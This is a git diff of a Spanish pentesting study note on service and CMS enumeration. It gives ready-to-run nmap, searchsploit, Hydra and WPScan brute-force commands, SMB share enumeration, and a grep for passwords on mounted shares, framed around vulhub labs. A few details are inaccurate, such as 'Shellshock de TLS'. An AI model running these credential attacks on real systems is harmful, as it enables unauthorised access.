@@ -2,236 +2,246 @@
 aliases:
   - Enumeración de Servicios
   - Enumeración de CMS
+  - Service Fingerprinting
+  - Fingerprinting de Versiones
 tags:
-  - hacking/reconocimiento
+  - sec/recon
   - hacking/explotacion
   - hacking/herramientas
-  - hacking/web
   - redes/protocolos
-  - scripting/bash
-  - hacking/laboratorios
-estado: 🟢 Terminado
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Reconocimiento y Escaneo de Redes y Web]]"
+  - "[[Nmap Guía Completa]]"
+  - "[[WPScan]]"
+  - "[[Droopscan]]"
+  - "[[JoomScan Herramienta de Escaneo]]"
+  - "[[Gobuster]]"
+  - "[[WhatWeb Herramienta de Fingerprinting]]"
+fuente: "https://nmap.org/book/man-version-detection.html"
 ---
+
 # Enumeración de Servicios y CMS
 
-## Enumeración del servicio FTP
+La **enumeración** es el puente entre descubrir puertos y explotar servicios: identificar *qué* corre exactamente (software, versión, configuración, usuarios) y cruzar eso con bases de datos de vulnerabilidades. Un puerto abierto sin enumerar es una puerta sin cerradura a la vista; una versión conocida sin cruzar es información desperdiciada.
 
-FTP es un protocolo ampliamente utilizado para la **transferencia de archivos** en redes. La enumeración del servicio FTP implica recopilar información relevante, como la versión del servidor FTP, la configuración de permisos de archivos, los usuarios y las contraseñas (mediante ataques de fuerza bruta o guessing), entre otros.
+> [!info] Flujo de la enumeración
+> ```
+> puerto abierto → fingerprint (¿qué servicio/versión?) → enumeración (¿qué usuarios/rutas/módulos?)
+>               → vulnerability mapping (searchsploit/CVE) → explotación dirigida
+> ```
+> La regla: **cada hallazgo alimenta el siguiente paso**. La versión de OpenSSH te dice el distro; la distro te dice binarios y rutas; los módulos del CMS te dicen el exploit.
 
-> [!info]
-> FTP opera en dos puertos principales: el puerto 21 para el canal de control (comandos) y el puerto 20 para el canal de datos (transferencia de archivos en modo activo). En modo pasivo, el cliente negocia un puerto de datos aleatorio con el servidor.
+## 1. Fingerprinting de servicios con Nmap
 
-> [!warning]
-> Las vulnerabilidades comunes en FTP incluyen el acceso anónimo sin restricciones, credenciales débiles o por defecto, y la exposición de información sensible a través de listados de directorios. La falta de cifrado en FTP lo hace susceptible a la interceptación de credenciales y datos.
-
-A continuación, se proporciona el enlace al primer proyecto que abordamos en esta clase:
-
-- **Docker-FTP-Server**: [https://github.com/garethflowers/docker-ftp-server](https://github.com/garethflowers/docker-ftp-server)
-
-Una de las herramientas que usamos en esta clase para el primer proyecto que nos descargamos es [[THC Hydra|Hydra]]. [[THC Hydra|Hydra]] es una herramienta de pruebas de penetración de código abierto que se utiliza para realizar ataques de fuerza bruta contra sistemas y servicios protegidos por contraseña. La herramienta es altamente personalizable y admite una amplia gama de protocolos de red, como HTTP, FTP, SSH, Telnet, SMTP, entre otros.
-
-> [!tip]
-> Hydra es conocida por su capacidad de realizar ataques de fuerza bruta de forma rápida y eficiente, utilizando un enfoque multi-hilo. Permite especificar diccionarios de usuarios y contraseñas, así como patrones de ataque personalizados, lo que la convierte en una herramienta versátil para la auditoría de seguridad de credenciales.
-
-El siguiente de los proyectos que utilizamos para desplegar el contenedor que permite la autenticación de usuarios invitados para FTP, es el proyecto ‘**docker-anon-ftp**‘ de ‘**metabrainz**‘. A continuación, se proporciona el enlace al proyecto:
-
-- **Docker-ANON-FTP**: [https://github.com/metabrainz/docker-anon-ftp](https://github.com/metabrainz/docker-anon-ftp)
-
----
-## Enumeración de Servicio SSH
-
-SSH es un protocolo de administración remota que permite a los usuarios **controlar** y **modificar** sus servidores remotos a través de Internet mediante un mecanismo de **autenticación seguro**. Como una alternativa más segura al protocolo **Telnet**, que transmite información sin cifrar, SSH utiliza **técnicas criptográficas** para garantizar que todas las comunicaciones hacia y desde el servidor remoto estén cifradas.
-
-SSH proporciona un mecanismo para autenticar un usuario remoto, transferir entradas desde el cliente al host y retransmitir la salida de vuelta al cliente. Esto es especialmente útil para administrar sistemas remotos de manera segura y eficiente, sin tener que estar físicamente presentes en el sitio.
-
-> [!info]
-> SSH soporta varios métodos de autenticación, incluyendo contraseñas, claves públicas/privadas (SSH keys) y autenticación basada en host. La autenticación por claves es generalmente preferida por su mayor seguridad y automatización.
-
-> [!warning]
-> Las vulnerabilidades en SSH pueden surgir de versiones desactualizadas del servidor (que pueden contener fallos conocidos), el uso de cifrados débiles o obsoletos, y la configuración de autenticación basada en contraseña que es susceptible a ataques de fuerza bruta o de diccionario.
-
-A continuación, se proporciona el enlace directo a la web donde copiamos todo el comando de ‘docker’ para desplegar nuestro contenedor:
-
-- **Docker Hub OpenSSH-Server**: [https://hub.docker.com/r/linuxserver/openssh-server](https://hub.docker.com/r/linuxserver/openssh-server)
-
-Cabe destacar que a través de la versión de SSH, también podemos identificar el codename de la distribución que se está ejecutando en el sistema.
-
-Por ejemplo, si la versión del servidor SSH es “**OpenSSH 8.2p1 Ubuntu 4ubuntu0.5**“, podemos determinar que el sistema está ejecutando una distribución de Ubuntu. El número de versión “**4ubuntu0.5**” se refiere a la revisión específica del paquete de SSH en esa distribución de Ubuntu. A partir de esto, podemos identificar el **codename** de la distribución de Ubuntu, que en este caso sería “**Focal**” para Ubuntu 20.04.
-
-Todas estas búsquedas las aplicamos sobre el siguiente dominio:
-
-- **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)
-
-> [!tip]
-> Launchpad es una plataforma de colaboración para proyectos de software de código abierto, especialmente aquellos relacionados con Ubuntu. Permite a los desarrolladores alojar código, rastrear errores, traducir software y gestionar paquetes, siendo una fuente invaluable para identificar versiones de paquetes y sus correspondientes distribuciones.
-
-----
-## Enumeración del Servicio HTTP y HTTPS
-
-**HTTP** (**Hypertext Transfer Protocol**) es un protocolo de comunicación utilizado para la transferencia de datos en la World Wide Web. Se utiliza para la transferencia de contenido de texto, imágenes, videos, hipervínculos, etc. El puerto predeterminado para HTTP es el puerto 80.
-
-**HTTPS** (**Hypertext Transfer Protocol Secure**) es una **versión segura** de HTTP que utiliza SSL / TLS para cifrar la comunicación entre el cliente y el servidor. Utiliza el puerto 443 por defecto. La principal diferencia entre HTTP y HTTPS es que HTTPS utiliza una capa de seguridad adicional para cifrar los datos, lo que los hace más seguros para la transferencia.
-
-> [!info]
-> TLS (Transport Layer Security) es el sucesor de SSL (Secure Sockets Layer). Aunque a menudo se usan indistintamente, TLS es la versión más moderna y segura. Es crucial que los servidores utilicen versiones actuales de TLS (como TLS 1.2 o 1.3) y deshabiliten las versiones antiguas (SSLv2, SSLv3, TLS 1.0, TLS 1.1) debido a vulnerabilidades conocidas.
-
-Una de las herramientas que se abordan en esta clase para inspeccionar el certificado SSL es [[OpenSSL Comandos Principales|OpenSSL]]. [[OpenSSL Comandos Principales|OpenSSL]] es una biblioteca de software libre y de código abierto que se utiliza para implementar protocolos de seguridad en línea, como TLS (Transport Layer Security), SSL (Secure Sockets Layer). La biblioteca [[OpenSSL Comandos Principales|OpenSSL]] proporciona una implementación de estos protocolos para permitir que las aplicaciones se comuniquen de manera segura y encriptada a través de la red.
-
-> [!tip]
-> Además de `s_client`, OpenSSL es una suite de herramientas versátil que permite generar claves privadas, solicitudes de firma de certificados (CSRs), certificados autofirmados, y realizar operaciones criptográficas como cifrado/descifrado de archivos. Es fundamental para la gestión de la infraestructura de clave pública (PKI).
-
-Uno de los comandos que se abordan en esta clase haciendo uso de esta herramienta es el siguiente:
-
-➜ `openssl s_client -connect ejemplo.com:443`
-
-Con este comando, podemos **inspeccionar** el **certificado SSL** de un servidor web. El comando se conecta al servidor en el puerto 443 y muestra información detallada sobre el certificado SSL, como la validez del certificado, la fecha de caducidad, el tipo de cifrado, etc.
-
-Asimismo, otras de las herramientas que se abordan en esta clase son ‘**sslyze**‘ y [[sslscan]]. **Sslyze** es una herramienta de análisis de seguridad SSL que se utiliza para evaluar la configuración SSL de un servidor. Proporciona información detallada sobre el cifrado utilizado, los protocolos admitidos y los certificados SSL. **SSLScan** es otra herramienta de análisis de seguridad SSL que se utiliza para evaluar la configuración SSL de un servidor. Proporciona información detallada sobre los protocolos SSL / TLS admitidos, el cifrado utilizado y los certificados SSL.
-
-La principal diferencia entre sslyze y [[sslscan]] es que sslyze se enfoca en la **evaluación** de la seguridad SSL/TLS de un servidor web mediante una exploración exhaustiva de los protocolos y configuraciones SSL/TLS, mientras que [[sslscan]] se enfoca en la **identificación** de los **protocolos** SSL/TLS admitidos por el servidor y los cifrados utilizados.
-
-> [!tip]
-> Tanto Sslyze como SSLScan pueden generar informes en varios formatos (como JSON o XML), lo que facilita la integración con otras herramientas de análisis o sistemas de gestión de vulnerabilidades para automatizar la auditoría de configuraciones SSL/TLS.
-
-La identificación de las informaciones arrojadas por las herramientas de análisis SSL/TLS es de **suma importancia**, ya que nos puede permitir detectar vulnerabilidades en la configuración de un servidor y tomar medidas para proteger nuestra información confidencial.
-
-Por ejemplo, **Heartbleed** es una vulnerabilidad de seguridad que afecta a la biblioteca OpenSSL y permite a los atacantes acceder a la memoria de un servidor vulnerable. Si un servidor web es vulnerable a Heartbleed y lo detectamos a través de estas herramientas, esto significa que un atacante podría potencialmente acceder a información confidencial, como claves privadas, nombres de usuario y contraseñas, etc.
-
-> [!warning]
-> La vulnerabilidad Heartbleed (CVE-2014-0160) permitía a un atacante leer hasta 64 KB de memoria del servidor por cada solicitud maliciosa, explotando una implementación defectuosa de la extensión Heartbeat de TLS. Esto podía exponer claves privadas, credenciales de usuario y otros datos sensibles directamente de la memoria del proceso del servidor.
-
-A continuación, se proporciona el enlace al proyecto de Github donde desplegamos el laboratorio vulnerable a Heartbleed:
-
-- **CVE-2014-0160**: [https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160]
-
----------------
-## Enumeración del servicio SMB
-
-**SMB** significa **Server Message Block**, es un **protocolo** de comunicación de red utilizado para compartir archivos, impresoras y otros recursos entre dispositivos de red. Es un protocolo propietario de **Microsoft** que se utiliza en sistemas operativos **Windows**.
-
-**Samba**, por otro lado, es una implementación libre y de código abierto del **protocolo SMB**, que se utiliza principalmente en sistemas operativos basados en **Unix** y **Linux**. Samba proporciona una manera de compartir archivos y recursos entre dispositivos de red que ejecutan sistemas operativos diferentes, como Windows y Linux.
-
-Aunque SMB y Samba comparten una funcionalidad similar, existen algunas diferencias notables. SMB es un protocolo propietario de Microsoft, mientras que Samba es un proyecto de software libre y de código abierto. Además, SMB es una implementación más completa y compleja del protocolo, mientras que Samba es una implementación más ligera y limitada.
-
-> [!info]
-> SMB opera principalmente en los puertos TCP 139 (NetBIOS sobre TCP/IP) y 445 (SMB directo sobre TCP). El puerto 445 es el más común en las implementaciones modernas de SMB, ya que elimina la dependencia de NetBIOS.
-
-A continuación, se comparte el enlace correspondiente al proyecto de Github que utilizamos para desplegar un laboratorio de práctica con el que poder enumerar y explotar el servicio Samba:
-
-- **Samba Authenticated RCE**: [https://github.com/vulhub/vulhub/tree/master/samba/CVE-2017-7494]
-
-Una de las herramientas que utilizamos para la fase de reconocimiento es [[smbmap]]. [[smbmap]] es una herramienta de línea de comandos utilizada para enumerar recursos compartidos y permisos en un servidor SMB (Server Message Block) o Samba. Es una herramienta muy útil para la enumeración de redes y para la identificación de posibles vulnerabilidades de seguridad.
-
-Con [[smbmap]], puedes enumerar los recursos compartidos en un servidor SMB y obtener información detallada sobre cada recurso, como los permisos de acceso, los usuarios y grupos autorizados, y los archivos y carpetas compartidos. También puedes utilizar [[smbmap]] para identificar recursos compartidos que no requieren autenticación, lo que puede ser un problema de seguridad.
-
-Además, [[smbmap]] permite a los administradores de sistemas y a los auditores de seguridad verificar rápidamente la configuración de permisos en los recursos compartidos en un servidor SMB, lo que puede ayudar a identificar posibles vulnerabilidades de seguridad y a tomar medidas para remediarlas.
-
-> [!tip]
-> `smbmap` es particularmente útil para identificar recursos compartidos con permisos de escritura (`WRITE`) para usuarios no autenticados o con credenciales débiles, lo que puede ser un vector para la carga de archivos maliciosos o la escalada de privilegios.
-
-A continuación, se proporciona una breve descripción de algunos de los parámetros comunes de [[smbmap]]:
-
-- **-H**: Este parámetro se utiliza para especificar la dirección IP o el nombre de host del servidor SMB al que se quiere conectarse.
-- **-P**: Este parámetro se utiliza para especificar el puerto TCP utilizado para la conexión SMB. El puerto predeterminado para SMB es el 445, pero si el servidor SMB está configurado para utilizar un puerto diferente, este parámetro debe ser utilizado para especificar el puerto correcto.
-- **-u**: Este parámetro se utiliza para especificar el nombre de usuario para la conexión SMB.
-- **-p**: Este parámetro se utiliza para especificar la contraseña para la conexión SMB.
-- **-d**: Este parámetro se utiliza para especificar el dominio al que pertenece el usuario que se está utilizando para la conexión SMB.
-- **-s**: Este parámetro se utiliza para especificar el recurso compartido específico que se quiere enumerar. Si no se especifica, [[smbmap]] intentará enumerar todos los recursos compartidos en el servidor SMB.
-
-Asimismo, otra de las herramientas que se abordan en esta clase es [[smbclient Cliente de Línea de Comandos para SMBCIFS|smbclient]]. [[smbclient Cliente de Línea de Comandos para SMBCIFS|smbclient]] es otra herramienta de línea de comandos utilizada para interactuar con servidores SMB y Samba, pero a diferencia de [[smbmap]] que se utiliza principalmente para enumeración, smbclient proporciona una interfaz de línea de comandos para interactuar con los recursos compartidos SMB y Samba, lo que permite la descarga y subida de archivos, la ejecución de comandos remotos, la navegación por el sistema de archivos remoto, entre otras funcionalidades.
-
-> [!tip]
-> `smbclient` ofrece una interfaz similar a un cliente FTP, permitiendo comandos como `ls`, `get`, `put`, `cd`, y `mkdir` para interactuar directamente con los recursos compartidos. Esto es invaluable para la exploración manual y la exfiltración/infiltración de datos.
-
-En ocasiones podemos tener una gran cantidad de carpetas y archivos en el servicio lo que mediante la conexión puede ser algo complicado de visualizar y trabajar con ellos para esto nosotros podemos jugar con monturas para todo lo que tenemos en el servicio ponerlo en una carpeta, vamos a hacer uso de `cifs` y lo vamos a montar de la siguiente manera:
+La detección de versión (`-sV`) funciona por **sondeo y comparación**: Nmap envía probes específicos (TLS ClientHello, HTTP GET, SSH banner, comandos propios del protocolo) y empareja la respuesta con su base de firmas `nmap-service-probes`. `-sC` añade los scripts NSE por defecto (default).
 
 ```bash
-mount -t cifs //<IP>/carpeta <ruta donde se montara> ejm: mount -t cifs //127.0.0.1/myshare /mnt/mounted
+# Descubrimiento + versión + scripts por defecto, salida normal
+nmap -p<puertos> -sCV <IP> -oN target
+
+# Versión intensiva (más probes, más ruido, más precisión)
+nmap -p22,80,443 -sV --version-intensity 9 -sC -O -oN servicios <IP>
 ```
 
-> [!info]
-> El sistema de archivos CIFS (Common Internet File System) es una implementación del protocolo SMB en el kernel de Linux. Montar un recurso compartido SMB/CIFS permite acceder a los archivos remotos como si fueran locales, facilitando la interacción con herramientas estándar de Linux. Es importante gestionar correctamente las credenciales y permisos al montar para evitar exposiciones de seguridad.
+| Flag | Efecto |
+|---|---|
+| `-sV` | Activa la detección de versión (banner + probes) |
+| `--version-intensity 0-9` | Profundidad del emparejamiento (9 = agresivo) |
+| `--version-all` | Prueba **todos** los probes (ruidoso, lento) |
+| `-sC` | Scripts NSE `default` (enum básica, chequeos comunes) |
+| `-O` / `--osscan-guess` | Estimación de SO (complementa la versión) |
+| `-oN/-oG/-oA` | Guardar resultados para cruzarlos después con `searchsploit` |
 
-En cuanto a los parámetros más comunes de smbclient, algunos de ellos son:
+> [!tip] Leer el banner como información de sistema
+> `OpenSSH 8.2p1 Ubuntu 4ubuntu0.5` no es solo una versión: `4ubuntu0.5` es el **número de revisión del paquete** en Ubuntu — permite inferir el **codename** (Focal = 20.04) y, con él, el estado de parches del resto del sistema. El cruce se hace en <https://launchpad.net/ubuntu> (plataforma donde se rastrean versiones, bugs y cambios de paquetes Debian/Ubuntu).
 
-- **-L**: Este parámetro se utiliza para enumerar los recursos compartidos disponibles en el servidor SMB o Samba.
-- **-U**: Este parámetro se utiliza para especificar el nombre de usuario y la contraseña utilizados para la autenticación con el servidor SMB o Samba.
-- **-c**: Este parámetro se utiliza para especificar un comando que se ejecutará en el servidor SMB o Samba.
+## 2. De la versión a la vulnerabilidad
 
-Estos son algunos de los parámetros más comunes utilizados en smbclient, aunque hay otros disponibles. La lista completa de parámetros y sus descripciones se pueden encontrar en la documentación oficial de la herramienta.
-
-Por último, otra de las herramientas que utilizamos al final de la clase para enumerar el servicio Samba es ‘**[[CrackMapExec Guía de Uso|CrackMapExec]]**‘. [[CrackMapExec Guía de Uso|CrackMapExec]] (también conocido como CME) es una herramienta de prueba de penetración de línea de comandos que se utiliza para realizar auditorías de seguridad en entornos de Active Directory. CME se basa en las bibliotecas de Python ‘**impacket**‘ y es compatible con sistemas operativos Windows, Linux y macOS.
-
-**CME** puede utilizarse para realizar diversas tareas de auditoría en entornos de **Active Directory**, como enumerar usuarios y grupos, buscar contraseñas débiles, detectar sistemas vulnerables y buscar vectores de ataque. Además, CME también puede utilizarse para ejecutar ataques de diccionario de contraseñas, ataques de **Pass-the-Hash** y para explotar vulnerabilidades conocidas en sistemas Windows. Asimismo, cuenta con una amplia variedad de módulos y opciones de configuración, lo que la convierte en una herramienta muy flexible para la auditoría de seguridad de entornos de Active Directory. La herramienta permite automatizar muchas de las tareas de auditoría comunes, lo que ahorra tiempo y aumenta la eficiencia del proceso de auditoría.
-
-> [!tip]
-> `CrackMapExec` es excepcionalmente potente para la enumeración y explotación en entornos de Active Directory, no solo para SMB. Puede interactuar con múltiples protocolos (SMB, WinRM, SSH, LDAP) y es capaz de ejecutar comandos remotos, volcar hashes, y realizar movimientos laterales, lo que la convierte en una herramienta esencial en auditorías de red internas.
-
-A continuación, se comparte el enlace directo a la Wiki para que podáis instalar la herramienta:
-
-- **CrackMapExec**: [https://wiki.porchetta.industries/getting-started/installation/installation-on-unix]
-
-----
-## Enumeración de Gestores de Contenido
-
-### WordPress
-
-WordPress es un CMS de código abierto muy popular que fue lanzado en 2003. Es utilizado por millones de sitios web en todo el mundo y se destaca por su facilidad de uso y flexibilidad. Con WordPress, los usuarios pueden crear y personalizar sitios web sin necesidad de conocimientos de programación avanzados. Además, cuenta con una amplia variedad de plantillas y plugins que permiten añadir funcionalidades adicionales al sitio.
-
-El proyecto que utilizamos en esta clase para enumerar un WordPress es el siguiente:
-
-- **DVWP**: [https://github.com/vavkamil/dvwp]
-
-Una de las herramientas que utilizamos en esta clase para enumerar este gestor de contenido es **[[wpscan]]**. [[wpscan]] es una herramienta de código abierto que se utiliza para escanear sitios web en busca de vulnerabilidades de seguridad en WordPress.
-
-Con [[wpscan]], podemos realizar una enumeración completa del sitio web y obtener información detallada sobre la instalación de WordPress, como la versión utilizada, los plugins y temas instalados y los usuarios registrados en el sitio. También nos permite realizar pruebas de fuerza bruta para descubrir contraseñas débiles y vulnerabilidades conocidas en plugins y temas.
-
-[[wpscan]] es una herramienta muy útil para los administradores de sitios web que desean mejorar la seguridad de su sitio WordPress, ya que permite identificar y corregir vulnerabilidades antes de que sean explotadas por atacantes malintencionados. Además, es una herramienta fácil de usar y muy efectiva para identificar posibles debilidades de seguridad en nuestro sitio web.
-
-> [!tip]
-> WPSCAN puede utilizar una clave API gratuita de WPScan Vulnerability Database para obtener información más actualizada sobre vulnerabilidades de plugins, temas y el core de WordPress. Esto mejora significativamente la precisión y la exhaustividad de los escaneos.
-
-El uso de esta herramienta es bastante sencillo, a continuación se indica la sintaxis básica:
-
-➜ `wpscan --url https://example.com`
-
-Si deseas enumerar usuarios o plugins vulnerables en WordPress utilizando la herramienta wpscan, puedes añadir los siguientes parámetros a la línea de comandos:
-
-**➜** `wpscan --url https://example.com --enumerate u`
-
-En caso de querer enumerar plugins existentes los cuales sean vulnerables, puedes añadir el siguiente parámetro a la línea de comandos:
-
-➜ `wpscan --url https://example.com --enumerate vp`
-
-En este caso estamos también en ocasiones se puede ver en el código de fuente de las webs los plugins y para poder listarlos solo como ejemplo porque no siempre sirve vamos a poder filtrar de la siguiente manera la información:
 ```bash
-curl -s -X GET "localhost:31337" | grep -oP 'plugins/\K[^/]+' | sort -u
+# Coincidencia producto + versión en Exploit-DB local
+searchsploit openssh 8.2
+searchsploit "vsftpd 2.3.4"
+searchsploit --nmap target.xml        # cruce automático con salida de nmap
+
+# Otras fuentes
+# NVD:        https://nvd.nist.gov/  (buscar producto + versión)
+# Vulners:    scripts NSE de nmap (vulners, vulscan)
+# CISA KEV:   vulnerabilidades en explotación activa
 ```
 
-> [!tip]
-> La expresión regular `plugins/\K[^/]+` en `grep -oP` utiliza `\K` para reiniciar la coincidencia, lo que significa que solo se imprime la parte que sigue a `plugins/` hasta el siguiente `/`. Esto es útil para extraer nombres de directorios de plugins de URLs o rutas en el código fuente.
+| Señal de la versión | Acción |
+|---|---|
+| Versión exacta con exploit público | Candidata nº 1 → verificar PoC y safety antes |
+| Versión con CVE pero sin exploit | Buscar config errónea (más común de lo que parece) |
+| Banner manipulado/evasivo (`-sV` da `unknown`) | Probar con probes manuales (`nc`, `curl -I`, clientes nativos) |
+| Servicio con banner de framework (p. ej. `Server: Apache/2.4.49`) | Cross-site: esa versión + función concreta (mod_proxy) = CVE-2021-41773 |
 
-Asimismo, otro de los recursos que contemplamos en esta clase es el archivo **xmlrpc.php**. Este archivo es una característica de WordPress que permite la comunicación entre el sitio web y aplicaciones externas utilizando el protocolo **XML-RPC**.
+> [!warning] Falsos positivos
+> `-sV` a veces falla por banners editados (`ServerTokens Prod`), proxies delante del servicio o timeouts. **Verifica siempre con el cliente nativo** (`ssh -v`, `openssl s_client`, `ftp`) antes de dar una versión por buena en el informe.
 
-El archivo xmlrpc.php es utilizado por muchos plugins y aplicaciones móviles de WordPress para interactuar con el sitio web y realizar diversas tareas, como publicar contenido, actualizar el sitio y obtener información.
+## 3. Enumeración por servicio
 
-Sin embargo, este archivo también puede ser abusado por atacantes malintencionados para aplicar **fuerza bruta** y descubrir **credenciales válidas** de los usuarios del sitio. Esto se debe a que xmlrpc.php permite a los atacantes realizar un número ilimitado de solicitudes de inicio de sesión sin ser bloqueados, lo que hace que la ejecución de un ataque de fuerza bruta sea relativamente sencilla.
+### 3.1 FTP (puertos 20/21)
 
-> [!warning]
-> `xmlrpc.php` fue una interfaz clave para la interacción remota con WordPress, pero su diseño lo hizo vulnerable a ataques de fuerza bruta y DDoS (mediante pingbacks). Aunque su funcionalidad ha sido en gran parte reemplazada por la REST API, aún puede estar habilitado en sitios antiguos o mal configurados, representando un riesgo de seguridad.
+FTP transmite credenciales y datos **en claro**: 21 (control) y 20 (datos en modo activo; en pasivo el cliente negocia un puerto aleatorio).
 
-Lo que vamos a hacer una vez comprobado que el archivo existe y esto se descubre mediante el fuzzing o de forma manual poniendo `http://localhost:31337/xmlrpc.php` y listo, entonces ya con esto claro teniendo acceso lo primero será listar todos los métodos que tenemos disponibles los cuales no servirán para diferentes cosas y con esto claro lo que vamos a hacer es tramitar una petición de la siguiente manera:
+| Qué buscar | Cómo | Riesgo asociado |
+|---|---|---|
+| Acceso anónimo | `ftp <IP>` → `anonymous`/`anonymous` | Lectura/escritura de archivos |
+| Versiones (vsftpd, proftpd, pure-ftpd) | banner o `nmap -sV` | CVEs de backdoors/bugs conocidos |
+| Permisos de directorio (`LIST`, `SITE CHMOD`) | sesión manual | Escritura → webshell |
+| Credenciales débiles | [[THC Hydra\|Hydra]] (`hydra -L users.txt -P rockyou.txt ftp://IP`) | Acceso directo |
 
-Creamos el archivo file.xml o el nombre que queramos y le ponemos el contenido:
+```bash
+# Laboratorio FTP (Docker)
+# https://github.com/garethflowers/docker-ftp-server          (autenticado)
+# https://github.com/metabrainz/docker-anon-ftp               (anónimo)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10 -V
+```
+
+### 3.2 SSH (puerto 22)
+
+Administración remota cifrada — a diferencia de Telnet. Métodos de autenticación: contraseña, clave pública, host-based (poco común).
+
+| Qué buscar | Herramienta | Nota |
+|---|---|---|
+| Versión/banner | `ssh -v user@IP`, `nmap -sV -p22` | Ubuntu/Debian/FreeBSD según build |
+| Diccionario | [[THC Hydra\|Hydra]] (`hydra -L -P ssh://IP`), `medusa` | Rate-limit y bloqueos: `fail2ban` corta el ataque |
+| Algoritmos débiles | [[SSLyze Analizador SSL TLS]] no aplica; usar `ssh-audit` | CBC, diffie-hellman-group1, `ssh-rsa` → remediar |
+| Claves por defecto / ids_rsa expuestos | buscar en repos y `searchsploit` | Escalada inmediata |
+
+> [!tip] Versión SSH = versión del sistema
+> El paquete OpenSSH está fuertemente ligado al SO: `OpenSSH 8.2p1 Ubuntu-4ubuntu0.5` → Ubuntu 20.04 con los parches hasta esa revisión. Útil para estimar qué vulnerabilidades del kernel/distro están o no aplicadas — pero **estimación**, no prueba (usa `nmap -O`, `p0f` o post-explotación para confirmar).
+
+### 3.3 HTTP/HTTPS (80/443)
+
+| Qué buscar | Herramienta | Ejemplo |
+|---|---|---|
+| Tecnologías y versiones | [[WhatWeb Herramienta de Fingerprinting\|WhatWeb]], Wappalyzer, BuiltWith | `whatweb https://IP` |
+| Certificado y cifrado | [[OpenSSL Comandos Principales\|OpenSSL]] | `openssl s_client -connect ejemplo.com:443` |
+| Protocolos/cifrados débiles | [[SSLScan]], [[SSLyze Analizador SSL TLS\|SSLyze]] | `sslscan IP:443` |
+| Directorios/rutas | [[Gobuster]], [[WFuzz]] | `gobuster dir -u http://IP -w wordlist` |
+| Headers de seguridad | `curl -sI` | faltan `HSTS`, `X-Frame-Options`, `CSP`… |
+
+```bash
+openssl s_client -connect ejemplo.com:443 </dev/null | openssl x509 -noout -subject -dates -issuer
+sslscan IP:443                 # protocolos y cifrados admitidos
+sslyze --regular IP            # evaluación profunda de la configuración
+```
+
+**SSLScan vs SSLyze**: SSLScan identifica **qué** protocolos/cifrados acepta el servidor (panorama rápido, salida amigable); SSLyze evalúa **la calidad de la configuración** (renegociación, compresión, BEAST/POODLE/Lucky13, OCSP stapling, cabeceras) con informes JSON/XML para automatizar.
+
+> [!warning] Heartbleed (CVE-2014-0160)
+> Bug en la extensión Heartbeat de OpenSSL: el servidor devuelve **hasta 64 KB de su memoria por petición** → claves privadas, cookies y credenciales en claro. Detección: `nmap -sV --script ssl-heartbleed` o SSLScan/SSLyze. Laboratorio: <https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160>. Otros clásicos del mismo ámbito: POODLE (SSLv3), BEAST, ROBOT, Shellshock de TLS… ver [[SSLScan]].
+
+### 3.4 SMB (139/445)
+
+**SMB** es el protocolo propietario de Microsoft para compartir archivos/impresoras; **Samba** es su implementación libre para Unix/Linux.
+
+| Herramienta | Uso principal | Flags clave |
+|---|---|---|
+| **[[SMBMap]]** | Enumerar shares y permisos sin o con credenciales | `-H host` · `-P 445` · `-u user` · `-p pass` · `-d dominio` · `-s share` |
+| **[[smbclient Cliente de Línea de Comandos para SMBCIFS\|smbclient]]** | Interacción tipo FTP con el share | `-L //IP` listar · `-U user%pass` · `-c "get archivo"` · `ls/get/put/cd` |
+| **[[CrackMapExec Guía de Uso\|CrackMapExec]]** | Auditoría a escala en AD (SMB, WinRM, LDAP, SSH) | ejecución remota, `--shares`, pass-the-hash, módulos |
+| **enum4linux-ng** | Usuarios/grupos/flows sin credenciales | reemplazo moderno de enum4linux |
+
+```bash
+smbmap -H 192.168.1.10                          # shares anónimos
+smbmap -H IP -u usuario -p clave -s SHARE       # con credenciales
+smbclient //IP/share -U user%pass -c 'ls; get backup.zip'
+mount -t cifs //IP/carpetas /mnt/montaje -o user=U,pass=P   # montar el share
+```
+
+> [!info] Montar con CIFS
+> El kernel de Linux implementa CIFS (subset de SMB): montar un share permite usarlo con herramientas normales (`cp`, `grep`, `find`). Ventaja para auditoría masiva: `grep -r "password" /mnt/montaje`. Riesgo operativo: recuerda desmontar (`umount /mnt/montaje`) y no dejes credenciales en el comando (quedan en el historial).
+
+Laboratorio: <https://github.com/vulhub/vulhub/tree/master/samba/CVE-2017-7494> (Samba remote code execution).
+
+## 4. Enumeración de CMS
+
+### 4.1 Cómo se detecta un CMS (mecánica)
+
+| Señal | Ejemplo | Fiabilidad |
+|---|---|---|
+| **Cabecera `X-Powered-By` / cookies** | `X-Powered-By: PHP/7.4`, `wordpress_logged_in_…` | Alta |
+| **Meta `generator`** | `<meta name="generator" content="WordPress 6.4.2">` | Alta (se puede ocultar) |
+| **Rutas únicas** | `/wp-content/`, `/administrator/`, `/sites/all/`, `/media/jomres/` | Alta |
+| **`robots.txt` / `sitemap.xml`** | listan `/wp-admin/`, `/administrator/` | Media |
+| **Assets con versión** | `wp-includes/js/wp-emoji-release.min.js?ver=6.4.2` | Alta (versión exacta) |
+| **Huella de temas/plugins** | `/wp-content/plugins/contact-form-7/` | Alta — vector de ataque |
+
+```bash
+# Huella manual rápida
+curl -s https://IP/ | grep -oiE 'generator" content="[^"]+'
+curl -s https://IP/robots.txt
+curl -s https://IP/ | grep -oP 'plugins/\K[^/]+' | sort -u
+#   \K reinicia la coincidencia: se imprime solo lo que va tras "plugins/" hasta el "/"
+```
+
+### 4.2 WordPress → [[WPScan]]
+
+```bash
+wpscan --url https://example.com                        # fingerprint básico
+wpscan --url https://example.com -e u                   # enumerar usuarios
+wpscan --url https://example.com -e vp                  # plugins vulnerables
+wpscan --url https://example.com -e vt --api-token TOK  # temas + base de datos CVE
+wpscan --url https://example.com -U users.txt -P rockyou.txt   # (con autorización)
+```
+
+| Elemento | Por qué importa |
+|---|---|
+| **Core versioned** (`?ver=`) | Versión exacta → CVEs del core |
+| **Plugins/temas activos** | 90% de las compromisiones entran por plugins abandonados |
+| **Usuarios enumerables** (`/author/nombre`) | Nombre real → phishing/fuerza bruta |
+| **`xmlrpc.php`** | Multiplica intentos de login y amplifica DDoS (§4.5) |
+
